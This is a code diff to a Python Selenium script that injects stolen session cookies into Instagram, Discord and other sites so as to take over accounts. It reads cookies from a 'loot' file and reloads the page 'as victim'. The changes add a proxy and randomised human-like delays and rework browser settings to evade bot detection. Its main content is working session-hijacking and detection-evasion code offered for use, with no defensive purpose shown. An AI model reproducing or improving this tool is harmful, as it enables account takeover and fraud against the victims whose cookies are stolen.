@@ -1,5 +1,6 @@
 import os
 import time
+import random
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
@@ -7,7 +8,7 @@ from selenium_stealth import stealth
 import undetected_chromedriver as uc
 
 # Constants
-LOOT_FILE = "loot/stolen_tokens.txt"
+LOOT_FILE = "loot/all_cookies.txt"
 TARGET_SITES = {
     "1": ("Instagram", "https://www.instagram.com"),
     "2": ("Discord", "https://discord.com"),
@@ -23,10 +24,11 @@ def configure_driver(headless=False):
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-blink-features=AutomationControlled")
     options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
-    
-    driver = uc.Chrome(options=options)
-    stealth(driver, languages=["en-US", "en"], vendor="Google Inc.", platform="Win32", webgl_vendor="Intel Inc.", renderer="Intel Iris OpenGL", fix_hairline=True)
-    return driver
+    options.add_argument('--proxy-server=http://your_proxy_here')
+    return uc.Chrome(options=options)
+
+def human_delay(min_sec=1, max_sec=3):
+    time.sleep(random.uniform(min_sec, max_sec))
 
 def choose_target():
     print("\n[🎯] Choose a target to inject:")
@@ -76,11 +78,9 @@ def run():
         print("[!] No cookies found for this domain.")
         return
         
-    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-    
     driver = configure_driver(headless=False)
     driver.get(url)
-    time.sleep(3)
+    human_delay(3)
     inject_cookies(driver, cookies, domain)
 
     print("\n[💉] Session cookies injected. Reloading page as victim...")
